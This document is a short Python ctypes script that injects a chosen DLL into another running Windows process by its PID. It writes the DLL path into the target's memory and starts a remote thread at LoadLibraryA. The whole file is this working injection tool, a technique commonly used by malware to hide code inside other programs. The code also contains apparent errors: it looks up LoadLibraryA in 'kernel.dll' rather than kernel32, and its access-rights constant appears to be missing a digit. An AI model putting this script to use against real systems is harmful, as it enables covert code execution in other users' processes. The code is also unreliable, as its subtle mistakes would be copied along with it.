#HANDLE WINAPI CreateRemoteThread(
# HANDLE hProcess,
# LPSECURITY_ATTRIBUTES lpThreadAttributes,
# SIZE_T dwStackSize,
# LPTHREAD_START_ROUTINE lpStartAddress,
# LPVOID lpParameter,
# DWORD dwCreationFlags,
# LPDWORD lpThreadId
#);




import sys
from ctypes import *

PAGE_READWRITE = 0x04
PROCESS_ALL_ACCESS = (0x000F000|0x00100000|0xFFF)
VIRTUAL_MEM = (0x1000|0x2000)

kernel32 = windll.kernel32
pid =  sys.argv[1]
dll_path = sys.argv[2]

dll_len = len(dll_path)

#get a handle of the process we are looking to inject into
h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,int(pid))

if not h_process:
    print("[-] couldnt acquire a handle to the PID")
    sys.exit(0)

#allocate new space for the dll path

arg_address = kernel32.VirtualAllocEx(h_process,0,dll_len,VIRTUAL_MEM,PAGE_READWRITE)

#write the dll path into the allocated space
written = c_int(0)
kernel32.WriteProcessMemory(h_process,arg_address,dll_path,dll_len,byref(written))

#we need to resolve address for LoadLibraryA
h_kernel32 = kernel32.GetModuleHandleA("kernel.dll")
h_loadlib = kernel32.GetProcAddress(h_kernel32,"LoadLibraryA")

#now we try to create a remote thread with entry point set to LoadLibraryA and a pointer to the DLL path as its single parameter 
thread_id = c_ulong(0)

if not kernel32.CreateRemoteThread(h_process,
                            None,
                            0,
                            h_loadlib,
                            arg_address,
                            0,
                            byref(thread_id)):
        
        print("[-]failed to inject the DLL. exiting")
        sys.exit(0)

print("[+]Remote thread with ID ",thread_id.value,"created")
